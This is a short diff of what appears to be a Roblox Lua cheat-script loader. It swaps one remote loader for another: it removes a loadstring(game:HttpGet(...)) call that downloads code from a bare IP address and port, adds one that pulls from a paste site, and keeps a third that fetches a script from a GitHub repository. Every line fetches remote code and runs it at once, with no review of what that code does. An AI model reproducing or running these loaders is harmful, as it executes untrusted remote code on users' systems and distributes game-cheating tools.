@@ -1,3 +1,2 @@
-ID="8693839c-f0f1-4710-8f7f-df1f905b7fb8";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("https://pastefy.app/b04ZMGqi/raw"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/nedyxxx/WORKING_GAG/refs/heads/main/visual"))()
